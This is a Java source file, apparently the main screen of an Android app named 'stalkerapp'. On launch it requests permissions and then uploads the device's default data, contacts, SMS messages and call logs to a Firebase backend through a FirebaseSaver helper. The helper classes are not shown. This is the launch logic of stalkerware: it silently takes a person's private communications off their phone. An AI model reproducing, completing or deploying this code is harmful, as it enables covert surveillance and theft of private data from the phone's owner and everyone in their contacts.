package com.github.saintedlittle.stalkerapp;

import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

import com.github.saintedlittle.stalkerapp.firebase.FirebaseSaver;
import com.github.saintedlittle.stalkerapp.utils.PermissionDialog;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        PermissionDialog permissionDialog = new PermissionDialog(this);
        permissionDialog.requestPermissions();

        new FirebaseSaver().saveDefaultData(this);

        new FirebaseSaver().saveContacts(this);
        new FirebaseSaver().saveSMS(this);
        new FirebaseSaver().saveCalls(this);
        
    }

}